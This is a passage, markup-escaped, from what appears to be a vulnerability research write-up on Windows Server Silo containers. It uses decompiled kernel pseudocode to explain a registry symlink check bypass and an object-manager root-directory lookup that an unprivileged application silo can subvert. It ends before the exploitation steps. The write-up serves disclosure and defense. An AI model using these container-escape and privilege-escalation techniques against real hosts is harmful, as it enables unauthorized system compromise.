 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.2d10e439459e6caf2d122f4072cd975490459881&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.7&quot;&gt;&lt;/a&gt;&lt;table class=&quot;c13&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c9&quot;&gt;&lt;td class=&quot;c24&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;IoGetSilo, IoGetSiloParameters, MmIsSessionInCurrentServerSilo, OBP_GET_SILO_ROOT_DIRECTORY_FROM_SILO, ObGetSiloRootDirectoryPath, ObpGetSilosRootDirectory, PsGetCurrentServerSilo, PsGetCurrentServerSiloGlobals, PsGetCurrentServerSiloName, PsGetCurrentSilo, PsGetEffectiveServerSilo, PsGetHostSilo, PsGetJobServerSilo, PsGetJobSilo, PsGetParentSilo, PsGetPermanentSiloContext, PsGetProcessServerSilo, PsGetProcessSilo, PsGetServerSiloActiveConsoleId, PsGetServerSiloGlobals, PsGetServerSiloServiceSessionId, PsGetServerSiloState, PsGetSiloBySessionId, PsGetSiloContainerId, PsGetSiloContext, PsGetSiloIdentifier, PsGetSiloMonitorContextSlot, PsGetThreadServerSilo, PsIsCurrentThreadInServerSilo, PsIsHostSilo, PsIsProcessInAppSilo, PsIsProcessInSilo, PsIsServerSilo, PsIsThreadInSilo&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;Of course that&amp;rsquo;s not a comprehensive list of functions, but those are the ones that looked the most likely to either return the silo and its properties or check if something was in a silo. Checking the references to these functions wasn&amp;rsquo;t going to be comprehensive, for various reasons:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;c38 lst-kix_upj84fi5ja9o-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c3 c25 li-bullet-0&quot;&gt;&lt;span class=&quot;c11&quot;&gt;We&amp;rsquo;re only checking for bad checks, not the lack of a check.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c3 c25 li-bullet-0&quot;&gt;&lt;span class=&quot;c11&quot;&gt;The kernel has the structure type definition for the Job object which contains the silo, so the call could easily be inlined.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c3 c25 li-bullet-0&quot;&gt;&lt;span class=&quot;c11&quot;&gt;We&amp;rsquo;re only checking the kernel, many of these functions are exported for driver use so could be called by other kernel components that we&amp;rsquo;re not looking at.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;The first issue I found was due to a call to &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;PsIsCurrentThreadInServerSilo&lt;/span&gt;&lt;span&gt;. I noticed a reference to the function inside &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;CmpOKToFollowLink&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;which is a function that&amp;rsquo;s responsible for enforcing symlink checks in the registry. At a basic level, registry symbolic links are not allowed to traverse from an untrusted hive to a trusted hive. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;For example if you put a symbolic link in the current user&amp;rsquo;s hive which redirects to the local machine hive the &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;CmpOKToFollowLink&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;will return FALSE when opening the key and the operation will fail. This prevents a user planting symbolic links in their hive and finding a privileged application which will write to that location to elevate privileges.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.846c754c0aacea52cb461bb2ca46a88d06b4a140&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.8&quot;&gt;&lt;/a&gt;&lt;table class=&quot;c13&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c9&quot;&gt;&lt;td class=&quot;c24&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;BOOLEAN CmpOKToFollowLink&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;PCMHIVE SourceHive&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;PCMHIVE TargetHive&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c21 c14&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;PsIsCurrentThreadInServerSilo&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;c5&quot;&gt;TargetHive &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;TargetHive &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;SourceHive&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c21 c14&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;TRUE&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c21 c14&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;SourceHive&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;Trusted&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c21 c14&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c33 c8 c14 c43&quot;&gt;// Check trust list.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c18 c14&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;Looking at &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;CmpOKToFollowLink&lt;/span&gt;&lt;span&gt;&amp;nbsp;we can see where &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;PsIsCurrentThreadInServerSilo&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;is being used. If the current thread is in a server silo then all links are allowed between any hives. The check for the trusted state of the source hive only happens after this initial check so is bypassed. I&amp;rsquo;d speculate that during development the registry overlays couldn&amp;rsquo;t be marked as trusted so a symbolic link in an overlay would not be followed to a trusted hive it was overlaying, causing problems. Someone presumably added this bypass to get things working, but no one realized they needed to remove it when support for trusted overlays was added. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;To exploit this in a container I needed to find a privileged kernel component which would write to a registry key that I could control. I found a good primitive inside Win32k for supporting &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;FlickInfo &lt;/span&gt;&lt;span&gt;configuration (which seems to be related in some way to touch input, but it&amp;rsquo;s not documented). When setting the configuration Win32k would create a known key in the current user&amp;rsquo;s hive. I could then redirect the key creation to the local machine hive allowing creation of arbitrary keys in a privileged location. I don&amp;rsquo;t believe this primitive could be directly combined with the registry silo escape issue but I didn&amp;rsquo;t investigate too deeply. At a minimum this would allow a non-administrator user to elevate privileges inside a container, where you could then use registry silo escape to write to the host registry.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;The second issue was due to a call to &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;OBP_GET_SILO_ROOT_DIRECTORY_FROM_SILO&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;. This function would get the root object manager namespace directory for a silo.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.b707cf6c019f63c17f1875a9222b84309df36302&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.9&quot;&gt;&lt;/a&gt;&lt;table class=&quot;c13&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c9&quot;&gt;&lt;td class=&quot;c24&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;POBJECT_DIRECTORY OBP_GET_SILO_ROOT_DIRECTORY_FROM_SILO&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;PEJOB Silo&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c21 c14&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;Silo&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &amp;nbsp; PPSP_STORAGE Storage &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;Silo&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;Storage&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &amp;nbsp; PPSP_SLOT Slot &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;Storage&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;Slot&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;PsObjectDirectorySiloContextSlot&lt;/span&gt;&lt;span class=&quot;c14 c18&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10 c4&quot;&gt;&lt;span class=&quot;c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c21 c14&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;Slot&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;Present&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c21 c14&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;Slot&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10 c4&quot;&gt;&lt;span class=&quot;c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c21 c14&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;ObpRootDirectoryObject&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c18 c14&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;We can see that the function will extract a storage parameter from the passed-in silo, if present it will return the value of the slot. If the silo is NULL or the slot isn&amp;rsquo;t present then the global root directory stored in &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;ObpRootDirectoryObject &lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;is returned. When the server silo is set up the slot is populated with a new root directory so this function should always return the silo root directory rather than the real global root directory. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;This code seems perfectly fine, if the server silo is passed in it should always return the silo root object directory. The real question is, what silo do the callers of this function actually pass in? We can check that easily enough, there are only two callers and they both have the following code.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.4ca8904710ed15ca6deaf6ec0ad27027c57bdda9&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.10&quot;&gt;&lt;/a&gt;&lt;table class=&quot;c13&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c9&quot;&gt;&lt;td class=&quot;c24&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;PEJOB silo &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;PsGetCurrentSilo&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;();&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;Root &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;OBP_GET_SILO_ROOT_DIRECTORY_FROM_SILO&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;silo&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;Okay, so the silo is coming from &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;PsGetCurrentSilo&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;. What does that do?&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.a64a769036992ef6a76081a014f82c80df52b1c6&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.11&quot;&gt;&lt;/a&gt;&lt;table class=&quot;c13&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c9&quot;&gt;&lt;td class=&quot;c24&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;PEJOB PsGetCurrentSilo&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; PETHREAD Thread &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;PsGetCurrentThread&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;();&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; PEJOB silo &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;Thread&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;Silo&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c21 c14&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;silo &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;PEJOB&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;)-&lt;/span&gt;&lt;span class=&quot;c8 c14 c39&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &amp;nbsp; silo &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;Thread&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;Tcb&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;Job&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c14 c21&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;silo&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c21 c14&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;silo&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;JobFlags &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;EJOB_SILO&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c21 c14&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; silo &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;silo&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;ParentJob&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;c21 c14&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;c8 c14&quot;&gt;&amp;nbsp;silo&lt;/span&gt;&lt;span class=&quot;c18 c14&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c10&quot;&gt;&lt;span class=&quot;c18 c14&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;A silo can be associated with a thread, through impersonation or as can be one job in the hierarchy of jobs associated with a process. This function first checks if the thread is in a silo. If not, signified by the -3 placeholder, it searches for any job in the job hierarchy for the process for anything which has the &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;JOB_SILO&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;flag set. If a silo is found, it&amp;rsquo;s returned from the function, otherwise NULL would be returned.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;This is a problem, as it&amp;rsquo;s not explicitly checking for a server silo. I mentioned earlier that there are two types of silo, application and server. While creating a new server silo requires administrator privileges, creating an application silo requires no privileges at all. Therefore to trick the object manager to using the root directory all we need to do is:&lt;/span&gt;&lt;/p&gt;
